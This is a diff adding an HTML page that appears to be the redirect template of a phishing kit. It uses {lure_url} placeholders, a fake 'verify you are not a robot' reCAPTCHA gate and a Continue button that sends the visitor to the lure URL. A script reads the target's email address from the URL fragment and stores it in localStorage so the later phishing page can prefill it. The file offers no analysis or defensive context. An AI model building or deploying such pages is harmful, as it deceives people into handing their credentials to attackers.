@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAe1BMVEX0QzZMr1AhlvP/wQf/////vgD0Nia63LtAq0Ww0vkAkfP/4636uLRJrk3/+Pj6saz2bWT1TEBVs1l0v3e027X4/Pn8zsv0PzLQ6NEsm/T/xBVWrPX/zUim0Pr/4qD3+//H4vz/7cPzJg8zqDj94N7h7+Hd6/z/8tsAjPI036d3AAABpElEQVR4nO3cSU5CURBA0fr4aBVFAcWGxt79r1CIEzFx+Ovlk3M3UDmppIYVpZTLq9l1tN3govxuOGra7ma+WO4nRSm3MbhrHVhB2ExHzeogvM3wVREejKsSl5ECrCNsps0yrgYpwErCZrSIWc4Kawmn82j/ilYVNjdJvnrChpCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ8F/hIKmXP8LXUVJxkdXbkfB9mFWUU4+w+xF2P8LuR9j9CLsfYfeLcVYfR3M/z7OKSVJf4yPheT+r6CU1+Ss8S4qQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkPBf4f2JCx/i8cSFT7GenLSwv4ltDrDaDpdRdjlLrCPsPx8+lu96GcYawv7Z889P9u36sf2Lmi98eNos95O+AYpCk2OCi44MAAAAAElFTkSuQmCC"
+    />
+    <title>...Redirecting</title>
+    <script src="https://www.google.com/recaptcha/api.js"></script>
+  </head>
+
+  <body></body>
+  <div
+    id="welcome"
+    style="
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 90vh;
+      flex-direction: column;
+    "
+  >
+    <a href="{lure_url}">click me</a>
+    <h3>Please verify your not a robot and click continue</h3>
+    <div
+      class="g-recaptcha"
+      data-sitekey="6LflX9EgAAAAAAGfSKY8Tj3880bPUOQH5VKwRbRu"
+    ></div>
+    <br>
+    <button type="button" onclick="correctCaptcha()" style="background-color: #4787ed;color: white; border-color: #0067b8; width: 100px; height: 35px; font-weight: bold;cursor: pointer;" >Continue</button>
+  </div>
+  <script>
+    var aemail = "";
+    console.log(window.location.href.split('#'));
+     if(window.location.hash) {
+              const myArr = window.location.hash.split("#");
+              aemail = myArr[1];
+      }
+      console.log(aemail)
+    localStorage.setItem('email', aemail);
+    localStorage.setItem('everthingood', "true");
+    const cat = localStorage.getItem('email');
+    console.log(cat)
+  </script>
+  <script>
+    var correctCaptcha = function (response) {
+      console.log("verified");
+      window.location.assign({lure_url_js});
+      var t = {lure_url_js}
+
+    };
+
+    console.log({lure_url_js});
+  </script>
+</html>
